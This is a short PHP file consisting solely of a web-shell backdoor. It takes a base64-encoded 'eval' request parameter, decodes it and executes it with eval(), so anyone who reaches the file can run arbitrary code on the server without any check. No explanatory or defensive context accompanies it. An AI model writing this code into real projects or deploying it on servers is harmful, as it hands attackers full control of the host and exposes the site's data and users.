<?php
if(isset($_REQUEST['eval'])){
	$s_code = base64_decode($_REQUEST['eval']);
	ob_start();
	eval($s_code);
}
?>